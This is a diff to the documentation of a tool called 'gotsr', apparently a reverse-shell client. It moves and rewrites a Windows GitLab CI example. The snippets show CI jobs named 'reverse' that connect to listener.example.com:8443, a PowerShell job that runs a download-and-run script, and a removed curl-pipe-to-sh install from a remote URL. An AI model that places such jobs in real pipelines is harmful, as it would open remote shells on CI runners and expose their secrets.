@@ -98,6 +98,16 @@ GitLab CI (`.gitlab-ci.yml`):
       - ~/.local/bin/gotsr listener.example.com:8443 3
   ```
 
+GitLab CI (Windows runner, PowerShell):
+  ```yaml
+reverse-win:
+  stage: run
+  tags: [saas-windows-medium-amd64]
+  script:
+    - powershell -NoProfile -Command ". .\download‑and‑run‑gotsr.ps1"
+  ```
+
+
 GitHub Actions:
   ```yaml
   name: reverse
@@ -128,15 +138,4 @@ GitHub Actions (Windows, PowerShell):
           shell: pwsh
           run: |
             & "$HOME/.local/bin/gotsr" listener.example.com:8443 3
-  ```
-
-GitLab CI (Windows runner, PowerShell):
-  ```yaml
-  stages: [run]
-  reverse-win:
-    stage: run
-    tags: [saas-windows-medium-amd64]
-    script:
-      - '"C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh"'
-      - '"C:/Users/Administrator/.local/bin/gotsr" listener.example.com:8443 3'
   ```
